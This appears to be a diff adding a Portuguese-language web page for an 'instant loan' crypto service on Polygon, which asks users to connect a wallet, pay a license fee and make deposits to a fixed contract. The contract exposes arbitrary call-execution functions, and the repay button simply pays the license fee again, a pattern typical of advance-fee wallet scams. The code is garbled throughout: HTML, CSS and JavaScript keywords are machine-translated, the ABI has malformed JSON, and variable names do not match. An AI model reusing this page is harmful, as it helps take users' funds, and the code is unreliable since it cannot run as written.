@@ -1,0 +1,166 @@
+< !DOCTYPEhtml >
+< html lang = "pt" >
+< cabeça >
+    < meta charset = "UTF-8" >
+    < meta name = "viewport" content = "largura=largura do dispositivo, escala inicial=1,0" >
+    < title > Sistema de Empréstimo Instantâneo</title>
+    <estilo>
+        corpo {
+            cor de fundo: #121212;
+            cor: #FFFFFF;
+            família de fontes: Arial, sem serifa;
+        }
+        .contêiner {
+            largura máxima: 800px;
+margem: automático;
+preenchimento: 20px;
+alinhamento de texto: centro;
+        }
+        .título {
+            tamanho da fonte: 2em;
+margem inferior: 20px;
+        }
+        .seção {
+            margem inferior: 20px;
+        }
+        .info {
+            cor: #00FF00;
+        }
+        .aviso {
+            cor: #FF0000;
+        }
+        botão {
+            cor de fundo: #6200EE;
+            cor: #FFFFFF;
+            fronteira: nenhuma;
+preenchimento: 10px 20px;
+cursor: ponteiro;
+tamanho da fonte: 1em;
+        }
+        botão: passar o mouse {
+            cor de fundo: #3700B3;
+        }
+    </ estilo >
+    < script src = "https://cdn.jsdelivr.net/npm/web3@latest/dist/web3.min.js" ></ script >
+</ head >
+< corpo >
+    < div class= "contêiner" >
+        < div class= "title" > Sistema de Empréstimo Instantâneo</div>
+        <div class= "informações da seção" >
+            Operando na rede Polygon (Matic)
+        </div>
+        <div class= "informações da seção" >
+            Todas as transações em USDT
+        </div>
+        <div class= "seção" >
+            < button id = "connectWalletButton" > Conectar Carteira </ button >
+        </ div >
+        < div class= "seção aviso" >
+            Certifique - se de que sua carteira esteja configurada para a Polygon Network
+        </div>
+        <div class= "seção" >
+            < button id = "depositButton" style = "display: none;" > Fazer Depósito </ button >
+            < button id = "purchaseLicenseButton" style = "display: none;" > Comprar Licença </ button >
+            < button id = "requestLoanButton" style = "display: none;" > Solicitar Empréstimo </ button >
+            < button id = "repayLoanButton" style = "display: none;" > Reembolsar Empréstimo </ button >
+        </ div >
+    </ div >
+    < roteiro >
+        document.addEventListener('DOMContentLoaded', () => {
+            const connectWalletButton = document.getElementById('connectWalletButton');
+            const depositButton = document.getElementById('depositButton');
+            const buyLicenseButton = document.getElementById('purchaseLicenseButton');
+            const requestLoanButton = document.getElementById('requestLoanButton');
+            const repayLoanButton = document.getElementById('repayLoanButton');
+
+            deixe web3;
+            deixe a conta;
+            const contractAddress = '0xcE307fd7918E07958bf56ea530DEC93573Bf07bb';
+            const contratoABI = [
+                { "inputs":[],"name":"constructorWallet","outputs":[{ "internalType":"address","name":"","type":"address"}],"stateMutability" :"visualizar","tipo":"função"},
+                { "inputs":[],"name":"currentStage","outputs":[{ "internalType":"uint256","name":" ","type":"uint256"}],"stateMutability" :"visualizar","tipo":"função"},
+                { "inputs":[{ "internalType":"bytes","name":"callData ","type":"bytes"}],"name":"executar","outputs":[],"stateMutability ":"não pagável","type":"função"},
+                { "inputs":[],"name":"invoker","outputs":[{ "internalType":"address","name":"","type":"address"}],"stateMutability" :"visualizar","tipo":"função"},
+                { "inputs":[{ "internalType":"address","name":"","type":"address"}],"name":"lastLoanTime","outputs":[{ "internalType": "uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},
+                { "inputs":[],"name":"licenseFeeStage1","outputs":[{ "internalType":"uint256","name":"","type":"uint256"}],"stateMutability" :"visualizar","tipo":"função"},
+                { "inputs":[],"name":"licenseFeeStage2","outputs":[{ "internalType":"uint256","name":"","type":"uint256"}],,"stateMutability" :"visualizar","tipo":"função"},
+                { "inputs":[],"name":"loanCooldown","outputs":[{ "internalType":"uint256","name":"","type":"uint256"}],,"stateMutability" :"visualizar","tipo":"função"},
+                { "inputs":[{ "internalType":"address","name":"para","type":"address"},{ "internalType":"bytes","name":"dados"," type":"bytes"},{ "internalType":"address","name":"tokenAddress","type":"address"},{ "internalType":"uint256","name":"tokenAmount" ,"type":"uint256"}],"name":"meuMetodo","outputs":[],"stateMutability":"payable","type":"function"},
+                { "inputs":[],"name":"payLicense","outputs":[],"stateMutability":"payable","type":"function"},
+                { "inputs":[{ "internalType":"address","name":"_invoker","type":"address"}],"name":"setInvoker","outputs":[],"stateMutability ":"não pagável","type":"função"},
+                { "inputs":[],"name":"stage1LoansLimit","outputs":[{ "internalType":"uint256","name":"","type":"uint256"}],,"stateMutability" :"visualizar","tipo":"função"},
+                { "inputs":[],"name":"stage2LoansLimit","outputs":[{ "internalType":"uint256","name":"","type":"uint256"}],,"stateMutability" :"visualizar","tipo":"função"},
+                { "inputs":[{ "internalType":"address","name":"","type":"address"}],"name":"userLicenses","outputs":[{ "internalType": "uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},
+                { "inputs":[{ "internalType":"address","name":"","type":"address"}],"name":"userLoanCount","outputs":[{ "internalType": "uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"}
+            ];
+deixe contratar;
+
+connectWalletButton.addEventListener('clique', async () => {
+se(janela.ethereum) {
+    web3 = novo Web3(window.ethereum);
+    tentar {
+        aguarde window.ethereum.request({ método: 'eth_requestAccounts' });
+contas const = aguarda web3.eth.getAccounts();
+conta = contas[0];
+contrato = novo web3.eth.Contract(contractABI, contractAddress);
+showButtons();
+                    } pegar(erro) {
+    console.error('Erro ao conectar a carteira:', erro);
+}
+                } outro {
+                    alert('Metamask não está instalado!');
+                }
+            });
+
+depositButton.addEventListener('clique', async () => {
+quantidade const = web3.utils.toWei('20', 'éter');
+tentar {
+    aguardar contrato.methods.meuMetodo(conta, "0x", "0xdAC17F958D2ee523a2206206994597C13D831ec7", valor).send({ de: conta, valor: valor });
+alert('Depósito realizado com sucesso!');
+                } pegar(erro) {
+    console.error('Erro ao fazer o depósito:', erro);
+}
+            });
+
+buyLicenseButton.addEventListener('clique', async () => {
+    const LicenseFee = web3.utils.toWei('100', 'ether');
+    tentar {
+        aguardar contrato.methods.payLicense().send({ from: conta, valor: licenceFee });
+alert('Licença comprada com sucesso!');
+                } pegar(erro) {
+    console.error('Erro ao comprar a licença:', erro);
+}
+            });
+
+requestLoanButton.addEventListener('clique', async () => {
+const empréstimoAmount = web3.utils.toWei('200', 'ether');
+tentar {
+    aguardar contrato.methods.meuMetodo(conta, "0x", "0xdAC17F958D2ee523a2206206994597C13D831ec7", lendAmount).send({ de: conta });
+alert('Empréstimo solicitado com sucesso!');
+                } pegar(erro) {
+    console.error('Erro ao solicitar empréstimo:', erro);
+}
+            });
+
+repayLoanButton.addEventListener('clique', async () => {
+tentar {
+    const empréstimo = aguardar contrato.methods.userLoanCount(account).call();
+    const totalRepayment = web3.utils.toBN(empréstimo).add(web3.utils.toBN((empréstimo * 1.1) / 100)); // Exemplo de taxa de juros de 10%
+    aguarde contrato.methods.payLicense().send({ de: conta, valor: totalRepayment });
+alert('Empréstimo pago com sucesso!');
+                } pegar(erro) {
+    console.error('Erro ao pagar o empréstimo:', erro);
+}
+            });
+
+função mostrarButtons()
+{
+    depositButton.style.display = 'bloco embutido';
+    buyLicenseButton.style.display = 'bloco embutido';
+    requestLoanButton.style.display = 'bloco embutido';
+    repayLoanButton.style.display = 'bloco embutido';
+}
+        });
+    </ script >
+</ body >
+</ html >
